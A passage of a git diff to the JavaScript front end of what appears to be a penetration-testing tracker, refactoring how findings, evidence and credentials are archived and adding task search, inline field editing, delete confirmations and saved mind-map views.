+            <p class="small mono machine-meta-line">Domain Name: ${machine.hostname || '-'} <button class="icon-btn edit-inline-btn" data-edit-field="hostname" title="Edit Domain">✎</button></p>
           </div>
         </div>
       </div>
@@ -1943,6 +1756,7 @@ function renderMachineDetail(machine) {
           ${state.ui.machineTab === 'checklist' ? `
             <div class="section-toc">
               <div class="small dim">Sections</div>
+              <input type="text" class="section-toc-search" id="tocSearchInput" placeholder="Search tasks…" autocomplete="off">
               <div class="section-toc-list">
                 ${checklistNavPhases.map((phase) => {
                   const expanded = state.ui.openPhases.includes(phase.id);
@@ -1976,6 +1790,14 @@ function renderMachineDetail(machine) {
   `;
 }
 
+/* ───────────────────────────────────────────────
+  22. Router / Mount
+   ─────────────────────────────────────────────── */
+
+/**
+ * Main entry point: reads the hash route and renders the appropriate page.
+ * Tears down any open modals/fullscreen state before rendering.
+ */
 function mount() {
   setNav();
   document.body.classList.remove('mm-fs-active');
@@ -2000,16 +1822,6 @@ function mount() {
     return;
   }
 
-  if (path.startsWith('/credentials')) {
-    window.location.hash = '#/';
-    return;
-  }
-
-  if (path.startsWith('/tools') || path.startsWith('/mindmap')) {
-    window.location.hash = '#/';
-    return;
-  }
-
   if (path.startsWith('/timeline')) {
     main.innerHTML = renderTimeline();
     persist();
@@ -2022,6 +1834,15 @@ function mount() {
   persist();
 }
 
+/* ───────────────────────────────────────────────
+  23. Modal Display (showDialogSafely)
+   ─────────────────────────────────────────────── */
+
+/**
+ * Safely open a <dialog> as a modal, locking background scroll.
+ * Installs close handlers that restore scroll position and release
+ * the body overflow lock.  Watches for [open] attribute removal.
+ */
 function showDialogSafely(modal) {
   if (!modal) return;
 
@@ -2081,6 +1902,15 @@ function showDialogSafely(modal) {
   modal.addEventListener('close', onClose);
 }
 
+/* ───────────────────────────────────────────────
+  24. Event Wiring
+   Each wire* function attaches event listeners to the DOM created
+   by its matching render* function.  These must be called after every
+   innerHTML injection because the old DOM nodes (and their handlers)
+   are destroyed on re-render.
+   ─────────────────────────────────────────────── */
+
+/** Wire dashboard page: Add Machine button, delete machine, machine card clicks, and Reset. */
 function wireDashboard() {
   document.getElementById('openMachineModal')?.addEventListener('click', () => {
     fillMachineSelect();
@@ -2115,6 +1945,7 @@ function wireDashboard() {
   main.querySelectorAll('[data-delete-machine]').forEach((button) => {
     button.addEventListener('click', (event) => {
       event.stopPropagation();
+      if (!armConfirmButton(button)) return;
       const id = button.dataset.deleteMachine;
       const machine = machineById(id);
       if (!machine) return;
@@ -2130,59 +1961,11 @@ function wireDashboard() {
   });
 }
 
-function wireCredentials() {
-  const search = document.getElementById('credSearch');
-  renderCredentialRows();
-
-  search.addEventListener('input', (event) => {
-    renderCredentialRows(event.target.value);
-  });
-
-  document.getElementById('openCredModal')?.addEventListener('click', () => {
-    fillMachineSelect();
-    showDialogSafely(document.getElementById('credModal'));
-  });
-
-  document.getElementById('credTable').addEventListener('click', async (event) => {
-    const button = event.target.closest('button[data-action]');
-    if (!button) return;
-    const id = button.dataset.id;
-    const action = button.dataset.action;
-    const credential = state.credentials.find((entry) => entry.id === id);
-    if (!credential) return;
-
-    if (action === 'reveal') {
-      state.reveal[id] = !state.reveal[id];
-      renderCredentialRows(search.value);
-      persist();
-      return;
-    }
-
-    if (action === 'copy') {
-      await navigator.clipboard.writeText(credential.password || '');
-      showCopyFeedback(button, 'Copied!');
-      return;
-    }
-
-    if (action === 'delete') {
-      state.credentials = state.credentials.filter((entry) => entry.id !== id);
-      addActivity('updated_machine', `Deleted credential: ${credential.username}`, credential.machine_id);
-      renderCredentialRows(search.value);
-      persist();
-    }
-  });
-}
-
-function wireMindMap() {
-  renderMindMapBody();
-  document.querySelectorAll('[data-mode]').forEach((button) => {
-    button.addEventListener('click', () => {
-      state.ui.mindmapMode = button.dataset.mode;
-      mount();
-    });
-  });
-}
-
+/**
+ * Wire the inline-fullscreen toggle button on the mind map.
+ * Handles expanding to fill the viewport and collapsing back,
+ * preserving scroll position across transitions.
+ */
 function wireMMFullscreenBtn(machine, mmEl) {
   const fsBtn = mmEl.querySelector('#mm-fs-' + machine.id);
   if (!fsBtn) return;
@@ -2248,6 +2031,10 @@ function wireMMFullscreenBtn(machine, mmEl) {
   };
 }
 
+/**
+ * Re-render just the mind map area without a full page mount().
+ * Preserves the surrounding page state (checklist, sidebar, etc.).
+ */
 function refreshMindMapInPlace(machine) {
   const mmEl = document.getElementById('mm-container-' + machine.id);
   if (!mmEl) { mount(); return; }
@@ -2291,6 +2078,12 @@ function refreshMindMapInPlace(machine) {
   wireFsBlockDrag(mmEl, machine);
 }
 
+/* ───────────────────────────────────────────────
+  25. Mind Map Interactivity
+   SVG connectors, pan/zoom, fullscreen drag, lane scroll arrows.
+   ─────────────────────────────────────────────── */
+
+/** Attach click handlers to the up/down lane scroll arrows within the mind map. */
 function wireLaneScrollArrows(root) {
   root.querySelectorAll('.mm-lane-scroll-wrap').forEach(wrap => {
     const body    = wrap.querySelector('.mm-phase-lane-body') || wrap.querySelector('.mm-day-col-body');
@@ -2323,6 +2116,10 @@ function wireLaneScrollArrows(root) {
  *  SYNCHRONOUS — must be called after layout is ready (inside rAF or
  *  after repositionFsBlocks).  Uses getBoundingClientRect subtraction
  *  so it is immune to CSS transforms on the pan-canvas.
+ */
+/**
+ * Draw dashed SVG arrows between phase lanes for findings that
+ * have cross-phase parent relationships (e.g. recon → exploitation).
  */
 function drawCrossPhaseArrows(mmEl, machine) {
   // Remove existing overlay
@@ -2410,6 +2207,10 @@ function drawCrossPhaseArrows(mmEl, machine) {
 }
 
 /* ── Draw SVG connector curves for parent→child and finding→credential links ── */
+/**
+ * Draw SVG connector lines from parent findings to child findings
+ * and from findings to their linked credential blobs.
+ */
 function drawLeafConnectors(root) {
   root.querySelectorAll('.mm-leaf-conn-svg').forEach(el => el.remove());
 
@@ -2471,12 +2272,17 @@ function drawLeafConnectors(root) {
 }
 
 /* ── Reposition fullscreen blocks based on actual rendered sizes ── */
+/** Auto-position the fullscreen drag blocks in a grid layout. */
 function repositionFsBlocks(workspace) {
   if (!workspace) return;
-  const PHASE_SEQ = ['osint', 'recon', 'exploitation', 'post_exploitation', 'persistence'];
-  /* Include any extra phase blocks present in the DOM */
-  workspace.querySelectorAll('[data-mm-drag-block]').forEach(b => {
-    const pid = b.dataset.mmDragBlock;
+  /* Build phase sequence from the DOM blocks actually present.
+     Start with the canonical order, keep only IDs that have a block,
+     then append any extras. */
+  const canonicalIds = checklistPhases.map(p => p.id);
+  const presentIds = new Set();
+  workspace.querySelectorAll('[data-mm-drag-block]').forEach(b => presentIds.add(b.dataset.mmDragBlock));
+  const PHASE_SEQ = canonicalIds.filter(pid => presentIds.has(pid));
+  presentIds.forEach(pid => {
     if (!PHASE_SEQ.includes(pid)) PHASE_SEQ.push(pid);
   });
   const GAP = 60;
@@ -2493,6 +2299,10 @@ function repositionFsBlocks(workspace) {
 }
 
 /* ── Draggable free-form blocks for fullscreen ── */
+/**
+ * Make fullscreen mind-map blocks draggable via their header bars.
+ * After drag ends, saves positions and redraws connectors.
+ */
 function wireFsBlockDrag(mmEl, machine) {
   const workspace = mmEl.querySelector('.mm-fs-workspace');
   if (!workspace) return;
@@ -2545,6 +2355,8 @@ function wireFsBlockDrag(mmEl, machine) {
       block.style.zIndex = '';
       window.removeEventListener('mousemove', onMove);
       window.removeEventListener('mouseup', onUp);
+      /* Save all block positions */
+      saveFsBlockPositions(workspace, machine);
     };
 
     handle.addEventListener('mousedown', onDown);
@@ -2553,21 +2365,66 @@ function wireFsBlockDrag(mmEl, machine) {
   /* Reposition blocks based on actual sizes, then draw connectors */
   requestAnimationFrame(() => {
     repositionFsBlocks(workspace);
+    /* Restore saved block positions if available */
+    restoreFsBlockPositions(workspace, machine);
     updateFsConnectors(workspace);
     drawCrossPhaseArrows(mmEl, machine);
   });
 }
 
+/* ── Save / restore fullscreen block positions ── */
+/** Persist block positions (x,y per phase) to state.ui.mmViewState. */
+function saveFsBlockPositions(workspace, machine) {
+  if (!workspace || !machine) return;
+  if (!state.ui.mmViewState) state.ui.mmViewState = {};
+  if (!state.ui.mmViewState[machine.id]) state.ui.mmViewState[machine.id] = {};
+  const positions = {};
+  workspace.querySelectorAll('[data-mm-drag-block]').forEach(b => {
+    positions[b.dataset.mmDragBlock] = {
+      left: parseInt(b.style.left) || 0,
+      top:  parseInt(b.style.top)  || 0,
+    };
+  });
+  state.ui.mmViewState[machine.id].blocks = positions;
+  persist();
+}
+
+/** Restore saved block positions from state, falling back to auto-layout. */
+function restoreFsBlockPositions(workspace, machine) {
+  if (!workspace || !machine) return;
+  const saved = state.ui.mmViewState?.[machine.id]?.blocks;
+  if (!saved) return;
+  workspace.querySelectorAll('[data-mm-drag-block]').forEach(b => {
+    const pos = saved[b.dataset.mmDragBlock];
+    if (pos) {
+      b.style.left = pos.left + 'px';
+      b.style.top  = pos.top  + 'px';
+    }
+  });
+  /* Grow workspace to fit restored positions */
+  let maxRight = 0;
+  workspace.querySelectorAll('[data-mm-drag-block]').forEach(b => {
+    maxRight = Math.max(maxRight, (parseInt(b.style.left) || 0) + (b.offsetWidth || 280));
+  });
+  workspace.style.minWidth = (maxRight + 40) + 'px';
+}
+
 /* Position the SVG connector lines between adjacent phase blocks */
+/** Redraw the SVG connector lines between fullscreen phase blocks. */
 function updateFsConnectors(workspace) {
   if (!workspace) return;
   const svg = workspace.querySelector('.mm-fs-connectors-svg');
   if (!svg) return;
 
-  const PHASE_SEQ = ['osint', 'recon', 'exploitation', 'post_exploitation', 'persistence'];
+  /* Build phase sequence from the DOM blocks actually present.
+     Start with the canonical order (so phases stay in the right order),
+     keep only IDs that have a block, then append any extras. */
+  const canonicalIds = checklistPhases.map(p => p.id);
+  const presentIds = new Set();
+  workspace.querySelectorAll('[data-mm-drag-block]').forEach(b => presentIds.add(b.dataset.mmDragBlock));
+  const PHASE_SEQ = canonicalIds.filter(pid => presentIds.has(pid));
   /* Include any extra phase blocks present in the DOM */
-  workspace.querySelectorAll('[data-mm-drag-block]').forEach(b => {
-    const pid = b.dataset.mmDragBlock;
+  presentIds.forEach(pid => {
     if (!PHASE_SEQ.includes(pid)) PHASE_SEQ.push(pid);
   });
 
@@ -2613,6 +2470,10 @@ function updateFsConnectors(workspace) {
   svg.style.height = (maxH + 40) + 'px';
 }
 
+/**
+ * Attach mouse-based pan and scroll-wheel zoom to the mind-map viewport.
+ * Persists the current transform (scale, translateX/Y) in state.ui.mmViewState.
+ */
 function wireMindMapPanZoom(machine) {
   if (mmPanCleanup) { mmPanCleanup(); mmPanCleanup = null; }
   const vpEl     = document.getElementById('mm-vp-'     + machine.id);
@@ -2626,14 +2487,27 @@ function wireMindMapPanZoom(machine) {
     if (zoomResetBtn) zoomResetBtn.disabled = false;
   };
 
-  let tx = 0, ty = 0, scale = 1;
+  /* ── Restore saved pan/zoom or default ── */
+  if (!state.ui.mmViewState) state.ui.mmViewState = {};
+  const saved = state.ui.mmViewState[machine.id];
+  let tx = saved ? saved.tx : 0;
+  let ty = saved ? saved.ty : 0;
+  let scale = saved ? saved.scale : 1;
   let dragging = false, startX = 0, startY = 0, startTx = 0, startTy = 0;
 
   canvasEl.style.transformOrigin = '0 0';
 
+  function saveMmView() {
+    if (!state.ui.mmViewState) state.ui.mmViewState = {};
+    state.ui.mmViewState[machine.id] = { tx, ty, scale };
+    persist();
+  }
+
   function applyTransform() {
     canvasEl.style.transform = `translate(${tx}px,${ty}px) scale(${scale})`;
   }
+  /* Apply saved transform immediately */
+  applyTransform();
 
   function onMouseDown(e) {
     if (e.button !== 0) return;
@@ -2656,6 +2530,7 @@ function wireMindMapPanZoom(machine) {
     if (dragging) {
       dragging = false;
       vpEl.style.cursor = '';
+      saveMmView();
     }
   }
 
@@ -2671,6 +2546,7 @@ function wireMindMapPanZoom(machine) {
     ty -= my * (ratio - 1);
     scale = newScale;
     applyTransform();
+    saveMmView();
   }
 
   zoomResetBtn?.addEventListener('click', () => {
@@ -2678,6 +2554,9 @@ function wireMindMapPanZoom(machine) {
     ty = 0;
     scale = 1;
     applyTransform();
+    /* Clear saved view state for this machine */
+    if (state.ui.mmViewState) delete state.ui.mmViewState[machine.id];
+    persist();
     vpEl.scrollTo({ top: 0, left: 0, behavior: 'smooth' });
     /* Re-position blocks to their default layout */
     const workspace = mmEl.querySelector('.mm-fs-workspace');
@@ -2703,6 +2582,12 @@ function wireMindMapPanZoom(machine) {
   };
 }
 
+/**
+ * Master event wiring for the Machine Detail page.
+ * Delegates to wireChecklist, wireMachineCredentials, wireFindings,
+ * and sets up mind map, sidebar modal tabs, status dropdown,
+ * IP copy, inline field editing, and credential panel interactions.
+ */
 function wireMachineDetail(machine) {
   /* Disconnect any stale observers / pan listeners */
   if (mmResizeObserver) { mmResizeObserver.disconnect(); mmResizeObserver = null; }
@@ -2753,6 +2638,49 @@ function wireMachineDetail(machine) {
     mount();
   });
 
+  /* --- Click IP to copy --- */
+  document.querySelectorAll('[data-copy-ip]').forEach(el => {
+    el.addEventListener('click', async () => {
+      await navigator.clipboard.writeText(machine.ip);
+      showCopyFeedback(el, 'Copied!');
+    });
+  });
+
+  /* --- Inline edit buttons for IP / OS / Domain --- */
+  document.querySelectorAll('[data-edit-field]').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const field = btn.dataset.editField;
+
+      if (field === 'ip') {
+        const val = window.prompt('Edit IP Address', machine.ip);
+        if (val && val.trim() && val.trim() !== machine.ip) {
+          const old = machine.ip;
+          machine.ip = val.trim();
+          addActivity('updated_machine', `Changed IP: ${old} → ${machine.ip}`, machine.id);
+          persist(); mount();
+        }
+      } else if (field === 'os_type') {
+        const current = machine.os_type === 'windows' ? 'Windows' : 'Linux';
+        const next = machine.os_type === 'windows' ? 'linux' : 'windows';
+        const nextLabel = next === 'windows' ? 'Windows' : 'Linux';
+        if (window.confirm(`Switch OS from ${current} to ${nextLabel}?`)) {
+          machine.os_type = next;
+          addActivity('updated_machine', `Changed OS: ${current} → ${nextLabel}`, machine.id);
+          persist(); mount();
+        }
+      } else if (field === 'hostname') {
+        const val = window.prompt('Edit Domain Name', machine.hostname || '');
+        if (val !== null) {
+          const old = machine.hostname || '-';
+          machine.hostname = val.trim();
+          addActivity('updated_machine', `Changed domain: ${old} → ${machine.hostname || '-'}`, machine.id);
+          persist(); mount();
+        }
+      }
+    });
+  });
+
   wireChecklist(machine);
 
   /* --- Mind map finding clicks (always wired, regardless of active tab) --- */
@@ -2797,7 +2725,14 @@ function wireMachineDetail(machine) {
 
 }
 
+/**
+ * Wire the checklist accordion: phase toggle, check/uncheck items (with finding
+ * archival on uncheck), port filter, copy command to clipboard, evidence
+ * upload/drop/paste/delete/rename, and TOC search/jump.
+ */
 function wireChecklist(machine) {
+  const machinePhases = checklistPhaseCatalogForMachine(machine);
+
   async function addChecklistEvidence(itemId, files) {
     const imageFiles = getImageFilesFromList(files);
     if (!imageFiles.length) return;
@@ -2836,6 +2771,57 @@ function wireChecklist(machine) {
   document.getElementById('showIncompleteTasksBtn')?.addEventListener('click', () => {
     state.ui.checklistTaskFilter = state.ui.checklistTaskFilter === 'incomplete' ? 'all' : 'incomplete';
     mount();
+  });
+
+  /* ── Section TOC search ── */
+  const tocSearchInput = document.getElementById('tocSearchInput');
+  tocSearchInput?.addEventListener('input', () => {
+    const q = (tocSearchInput.value || '').toLowerCase().trim();
+    /* Filter TOC task buttons */
+    document.querySelectorAll('.section-toc-task').forEach(btn => {
+      const itemIds = (btn.dataset.taskGroup || btn.dataset.taskLink || '')
+        .split(',')
+        .map(id => id.trim())
+        .filter(Boolean);
+      if (!q) { btn.style.display = ''; return; }
+      const searchItems = itemIds
+        .map((id) => checklistItemById(id))
+        .filter(Boolean);
+      if (!searchItems.length) { btn.style.display = 'none'; return; }
+      const haystack = searchItems.map((item) => [
+        item.name || '',
+        item.description || '',
+        item.command || '',
+        ...(item.commands || []).map(c => (c.cmd || '') + ' ' + (c.desc || '') + ' ' + (c.subdesc || '')),
+      ].join(' ')).join(' ').toLowerCase();
+      btn.style.display = haystack.includes(q) ? '' : 'none';
+    });
+    /* Show/hide TOC groups that have no visible tasks */
+    document.querySelectorAll('.section-toc-group').forEach(group => {
+      const sublist = group.querySelector('.section-toc-sublist');
+      if (!sublist) return;
+      const anyVisible = [...sublist.querySelectorAll('.section-toc-task')].some(b => b.style.display !== 'none');
+      group.style.display = anyVisible || !q ? '' : 'none';
+      /* Auto-expand groups with matches */
+      if (q && anyVisible) sublist.style.display = 'block';
+    });
+    /* Filter main checklist items */
+    document.querySelectorAll('.check-item').forEach(el => {
+      if (!q) { el.style.display = ''; return; }
+      const text = el.textContent.toLowerCase();
+      el.style.display = text.includes(q) ? '' : 'none';
+    });
+    /* Hide phase accordions with no visible items */
+    document.querySelectorAll('.accordion-item').forEach(acc => {
+      if (!q) { acc.style.display = ''; return; }
+      const anyVisible = [...acc.querySelectorAll('.check-item')].some(el => el.style.display !== 'none');
+      acc.style.display = anyVisible ? '' : 'none';
+      /* Auto-expand accordions with matches */
+      if (anyVisible) {
+        const body = acc.querySelector('.accordion-body');
+        if (body) body.style.display = 'block';
+      }
+    });
   });
 
   document.querySelectorAll('[data-phase-toggle]').forEach((button) => {
@@ -2916,35 +2902,7 @@ function wireChecklist(machine) {
           }
 
           /* Archive evidence & credentials from the deleted findings */
-          if (!machine.archived_evidence) machine.archived_evidence = [];
-          if (!machine.archived_credentials) machine.archived_credentials = [];
-
-          for (const lf of linkedFindings) {
-            /* Archive evidence files (keep blobs in IndexedDB, just move metadata) */
-            for (const ev of (lf.evidence || [])) {
-              machine.archived_evidence.push({
-                ...ev,
-                archived_at: new Date().toISOString(),
-                source_finding_title: lf.title,
-                source_finding_id: lf.id,
-                source_type: 'finding_deleted_via_uncheck',
-              });
-            }
-            /* Archive credentials linked to this finding */
-            const linkedCreds = state.credentials.filter(c => c.finding_id === lf.id);
-            for (const cred of linkedCreds) {
-              machine.archived_credentials.push({
-                ...cred,
-                finding_id: null,
-                archived_at: new Date().toISOString(),
-                source_finding_title: lf.title,
-                source_finding_id: lf.id,
-                source_type: 'finding_deleted_via_uncheck',
-              });
-              /* Remove from active credentials */
-              state.credentials = state.credentials.filter(c => c.id !== cred.id);
-            }
-          }
+          for (const lf of linkedFindings) archiveFindingData(machine, lf, 'finding_deleted_via_uncheck');
 
           /* Remove findings */
           state.findings = state.findings.filter(f => f.source_checklist_item_id !== itemId);
@@ -2999,11 +2957,11 @@ function wireChecklist(machine) {
       let text;
       if (button.dataset.copyRawIdx !== undefined) {
         const [itemId, idxStr] = button.dataset.copyRawIdx.split('__');
-        const item = checklistPhases.flatMap((phase) => phase.items).find((e) => e.id === itemId);
+        const item = machinePhases.flatMap((phase) => phase.items).find((entry) => entry.id === itemId);
         if (!item || !item.commands) return;
         text = substituteTargetIp(item.commands[parseInt(idxStr, 10)].cmd, machine.ip);
       } else {
-        const item = checklistPhases.flatMap((phase) => phase.items).find((e) => e.id === button.dataset.copyCmd);
+        const item = machinePhases.flatMap((phase) => phase.items).find((entry) => entry.id === button.dataset.copyCmd);
         if (!item) return;
         text = substituteTargetIp(item.command, machine.ip);
       }
@@ -3060,6 +3018,7 @@ function wireChecklist(machine) {
 
   document.querySelectorAll('[data-delete-evidence]').forEach((button) => {
     button.addEventListener('click', async () => {
+      if (!armConfirmButton(button, button.textContent)) return;
       const id = button.dataset.deleteEvidence;
       const itemId = button.dataset.itemId;
       const file = (machine.item_evidence[itemId] || []).find((entry) => entry.id === id);
@@ -3070,39 +3029,10 @@ function wireChecklist(machine) {
       addActivity('updated_checklist', `Removed checklist evidence from ${checklistItem?.name || itemId}: ${file?.name || id}`, machine.id);
 
       // Archive (not delete) any auto-linked findings that were created from uploading this evidence
-      if (!machine.archived_evidence) machine.archived_evidence = [];
-      if (!machine.archived_credentials) machine.archived_credentials = [];
-
       const linkedFindings = state.findings.filter(
         f => f.source_checklist_item_id === itemId && (f.evidence || []).some(e => e.id === id)
       );
-      for (const lf of linkedFindings) {
-        /* Archive remaining evidence (not the one being deleted) */
-        for (const ev of (lf.evidence || [])) {
-          if (ev.id !== id) {
-            machine.archived_evidence.push({
-              ...ev,
-              archived_at: new Date().toISOString(),
-              source_finding_title: lf.title,
-              source_finding_id: lf.id,
-              source_type: 'finding_deleted_via_evidence_removal',
-            });
-          }
-        }
-        /* Archive credentials linked to this finding */
-        const linkedCreds = state.credentials.filter(c => c.finding_id === lf.id);
-        for (const cred of linkedCreds) {
-          machine.archived_credentials.push({
-            ...cred,
-            finding_id: null,
-            archived_at: new Date().toISOString(),
-            source_finding_title: lf.title,
-            source_finding_id: lf.id,
-            source_type: 'finding_deleted_via_evidence_removal',
-          });
-          state.credentials = state.credentials.filter(c => c.id !== cred.id);
-        }
-      }
+      for (const lf of linkedFindings) archiveFindingData(machine, lf, 'finding_deleted_via_evidence_removal', id);
       if (linkedFindings.length) {
         const linkedIds = new Set(linkedFindings.map(f => f.id));
         state.findings = state.findings.filter(f => !linkedIds.has(f.id));
@@ -3130,6 +3060,7 @@ function wireChecklist(machine) {
   });
 }
 
+/** Wire credential CRUD: add form toggle/submit, delete with confirm, reveal toggle. */
 function wireMachineCredentials(machine) {
   document.getElementById('openMachineCredForm')?.addEventListener('click', () => {
     state.ui.showAddMachineCred = true;
@@ -3188,6 +3119,7 @@ function wireMachineCredentials(machine) {
       }
 
       if (action === 'delete') {
+        if (!armConfirmButton(button)) return;
         state.credentials = state.credentials.filter((entry) => entry.id !== id);
         addActivity('updated_machine', `Deleted credential ${credential.username} (${credential.service || credential.cred_type})`, machine.id);
         mount();
@@ -3196,6 +3128,10 @@ function wireMachineCredentials(machine) {
   });
 }
 
+/**
+ * Wire the inline findings form: add form toggle/submit with evidence buffer
+ * management, edit/view/delete buttons, individual evidence CRUD.
+ */
 function wireFindings(machine) {
   function renderFindingEvidenceBuffer() {
     const list = document.getElementById('findingEvidenceList');
@@ -3244,52 +3180,12 @@ function wireFindings(machine) {
   });
 
   const findingInput = document.getElementById('findingEvidence');
-  findingInput?.addEventListener('change', (event) => {
-    addFindingEvidenceFiles(event.target.files || []);
-    event.target.value = '';
-  });
-
   const findingDrop = document.getElementById('findingEvidenceDrop');
-  findingDrop?.addEventListener('click', () => findingInput?.click());
-  findingDrop?.addEventListener('dragover', (event) => {
-    event.preventDefault();
-    findingDrop.classList.add('drag-over');
-  });
-  findingDrop?.addEventListener('mouseenter', () => {
-    findingDrop.focus({ preventScroll: true });
-  });
-  findingDrop?.addEventListener('dragleave', () => {
-    findingDrop.classList.remove('drag-over');
-  });
-  findingDrop?.addEventListener('drop', (event) => {
-    event.preventDefault();
-    findingDrop.classList.remove('drag-over');
-    addFindingEvidenceFiles(event.dataTransfer?.files || []);
-  });
-  findingDrop?.addEventListener('paste', (event) => {
-    const files = getImageFilesFromList(event.clipboardData?.files || []);
-    if (!files.length) return;
-    event.preventDefault();
-    addFindingEvidenceFiles(files);
-  });
+  wireDropzone(findingDrop, findingInput, addFindingEvidenceFiles);
 
   renderFindingEvidenceBuffer();
 
-  // Dynamically update parent options when phase changes in the add form
-  document.getElementById('findingPhase')?.addEventListener('change', (e) => {
-    const sel = document.getElementById('findingParentId');
-    if (!sel) return;
-    const ep = buildEligibleParents(machine.id, e.target.value, new Set());
-    let opts = '<option value="">Root Level (no parent)</option>';
-    opts += ep.samePhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('');
-    if (ep.crossPhase.length) {
-      const prevLabel = checklistPhases.find(p => p.id === ep.prevPhaseId)?.name || ep.prevPhaseId;
-      opts += `<optgroup label="Cross-phase (${prevLabel})">` +
-        ep.crossPhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('') +
-        '</optgroup>';
-    }
-    sel.innerHTML = opts;
-  });
+  wirePhaseParentSync(document, 'findingPhase', 'findingParentId', machine.id, new Set(), null, machine);
 
   document.getElementById('submitFindingForm')?.addEventListener('click', async () => {
     const title = document.getElementById('findingTitle').value.trim();
@@ -3325,41 +3221,15 @@ function wireFindings(machine) {
 
   document.querySelectorAll('[data-delete-finding]').forEach((button) => {
     button.addEventListener('click', async () => {
+      if (!armConfirmButton(button)) return;
       const id = button.dataset.deleteFinding;
       const finding = state.findings.find((entry) => entry.id === id);
       if (!finding) return;
-      if (!confirm(`Delete finding "${finding.title}"?\n\nAny tied evidence and credentials will be moved to the Archived section.`)) return;
 
-      if (!machine.archived_evidence) machine.archived_evidence = [];
-      if (!machine.archived_credentials) machine.archived_credentials = [];
-
-      /* Archive evidence */
-      for (const ev of (finding.evidence || [])) {
-        machine.archived_evidence.push({
-          ...ev,
-          archived_at: new Date().toISOString(),
-          source_finding_title: finding.title,
-          source_finding_id: finding.id,
-          source_type: 'finding_deleted_manually',
-        });
-      }
-
-      /* Archive credentials linked to this finding */
-      const linkedCreds = state.credentials.filter(c => c.finding_id === finding.id);
-      for (const cred of linkedCreds) {
-        machine.archived_credentials.push({
-          ...cred,
-          finding_id: null,
-          archived_at: new Date().toISOString(),
-          source_finding_title: finding.title,
-          source_finding_id: finding.id,
-          source_type: 'finding_deleted_manually',
-        });
-        state.credentials = state.credentials.filter(c => c.id !== cred.id);
-      }
+      const archivedCreds = archiveFindingData(machine, finding, 'finding_deleted_manually');
 
       state.findings = state.findings.filter((entry) => entry.id !== id);
-      const archivedCount = (finding.evidence || []).length + linkedCreds.length;
+      const archivedCount = (finding.evidence || []).length + archivedCreds;
       addActivity('updated_machine', `Deleted finding: ${finding.title}${archivedCount ? `. Archived ${archivedCount} item(s).` : ''}`, machine.id);
       persist();
       mount();
@@ -3372,6 +3242,7 @@ function wireFindings(machine) {
 
   document.querySelectorAll('[data-delete-finding-evidence]').forEach((button) => {
     button.addEventListener('click', async () => {
+      if (!armConfirmButton(button)) return;
       const findingId = button.dataset.findingId;
       const evidenceId = button.dataset.deleteFindingEvidence;
       const finding = state.findings.find((entry) => entry.id === findingId);
@@ -3413,6 +3284,20 @@ function wireFindings(machine) {
 /* ═══════════════════════════════════════════════
    Finding View Modal (mind map click → view → optional edit)
    ═══════════════════════════════════════════════ */
+/* ───────────────────────────────────────────────
+  26. Modal Functions
+   Full-page dialog overlays for viewing, editing, and managing data.
+   Each function builds its HTML, calls showDialogSafely(), and wires
+   event handlers inside the modal.
+   ─────────────────────────────────────────────── */
+
+/**
+ * Open the finding view/edit modal.
+ * Supports two modes:
+ * • View mode: read-only display with evidence gallery and credential links.
+ * • Edit mode: inline editing of all fields with evidence add/remove/rename
+ *   and credential link/unlink/create.
+ */
 function openFindingViewModal(findingId) {
   const finding = state.findings.find(f => f.id === findingId);
   if (!finding) return;
@@ -3423,11 +3308,6 @@ function openFindingViewModal(findingId) {
   let fvmRemovedEvidenceIds = new Set();
   let fvmRenamedEvidenceNames = new Map();
 
-  // Build eligible parent options (exclude self and descendants)
-  function getDescendantIds(id, all) {
-    return [id, ...all.filter(f => f.parent_id === id).flatMap(c => getDescendantIds(c.id, all))];
-  }
-
   function renderView(editing) {
     if (editing) {
       fvmEvidenceBuffer = [];
@@ -3436,15 +3316,9 @@ function openFindingViewModal(findingId) {
       const existingEvidence = (finding.evidence || []);
 
       const excludeIds = new Set(getDescendantIds(finding.id, state.findings));
-      const ep = buildEligibleParents(finding.machine_id, finding.phase, excludeIds);
       const createdText = formatDateTimeMilitary(finding.created_at);
       const changedText = formatDateTimeMilitary(finding.updated_at || finding.created_at);
-
-      const parentOptsSame = ep.samePhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('');
-      const parentOptsCross = ep.crossPhase.length
-        ? `<optgroup label="Cross-phase (${checklistPhases.find(p => p.id === ep.prevPhaseId)?.name || ep.prevPhaseId})">` +
-          ep.crossPhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('') +
-          '</optgroup>' : '';
+      const parentOptsHtml = parentFindingOptionsHtml(finding.machine_id, finding.phase, excludeIds, finding.parent_id, machineById(finding.machine_id));
 
       container.innerHTML = `
         <div class="finding-modal-header">
@@ -3461,19 +3335,19 @@ function openFindingViewModal(findingId) {
         <div class="split">
           <label>Severity
             <select id="fvmSev">
-              ${['critical','high','medium','low','info'].map(s => `<option value="${s}"${s === finding.severity ? ' selected' : ''}>${s.charAt(0).toUpperCase() + s.slice(1)}</option>`).join('')}
+              ${severityOptionsHtml(finding.severity)}
             </select>
           </label>
           <label>Phase
             <select id="fvmPhase">
-              ${checklistPhases.map(p => `<option value="${p.id}"${p.id === finding.phase ? ' selected' : ''}>${p.name}</option>`).join('')}
+              ${phaseOptionsHtml(checklistPhaseCatalogForMachine(machineById(finding.machine_id)), finding.phase)}
             </select>
           </label>
         </div>
         <label>Parent Finding
           <select id="fvmParentId">
             <option value="">Root Level (no parent)</option>
-            ${parentOptsSame}${parentOptsCross}
+            ${parentOptsHtml}
           </select>
         </label>
         <div class="finding-cred-box">
@@ -3497,10 +3371,7 @@ function openFindingViewModal(findingId) {
               <label>Password / Hash<input id="fvmNewCredPass" /></label>
               <label>Type
                 <select id="fvmNewCredType">
-                  <option value="plain">Plain Text</option>
-                  <option value="hash">Hash</option>
-                  <option value="key">SSH Key</option>
-                  <option value="token">Token</option>
+                  ${credTypeOptionsHtml()}
                 </select>
               </label>
             </div>
@@ -3560,34 +3431,12 @@ function openFindingViewModal(findingId) {
         renderFvmBuffer();
       }
 
-      // Rebuild parent options dynamically when phase changes (fvm)
-      container.querySelector('#fvmPhase')?.addEventListener('change', (e) => {
-        const sel = container.querySelector('#fvmParentId');
-        if (!sel) return;
-        const epNew = buildEligibleParents(finding.machine_id, e.target.value, excludeIds);
